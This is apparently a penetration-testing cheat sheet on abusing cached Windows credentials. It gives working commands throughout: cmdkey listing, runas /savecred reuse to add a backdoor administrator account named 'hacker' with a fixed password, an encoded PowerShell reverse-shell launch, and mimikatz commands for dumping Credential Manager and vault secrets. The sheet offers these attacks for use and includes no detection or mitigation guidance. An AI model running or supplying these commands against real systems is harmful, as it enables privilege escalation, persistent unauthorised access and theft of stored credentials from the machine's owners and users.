# Cached Windows Credentials (cmdkey + runas)

`cmdkey` stores credentials in Windows Credential Manager — `runas /savecred` reuses them without prompting.

**List cached credentials:**
```cmd
cmdkey /list
```

Look for entries like `TERMSRV/<hostname>` or `<domain>\<user>`.

**Use cached creds to run a command as another user:**
```cmd
runas /savecred /user:<domain>\<username> "cmd.exe /c <command>"
```

**Common privilege escalation:**
```cmd
runas /savecred /user:Administrator "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

**Reverse shell via cached admin creds:**
```cmd
runas /savecred /user:Administrator "powershell -enc <BASE64>"
```

**Also check:** `%APPDATA%\Microsoft\Credentials\` for DPAPI-encrypted blobs — decrypt with mimikatz if you have SYSTEM.

```cmd
mimikatz # sekurlsa::credman
mimikatz # vault::cred /patch
```
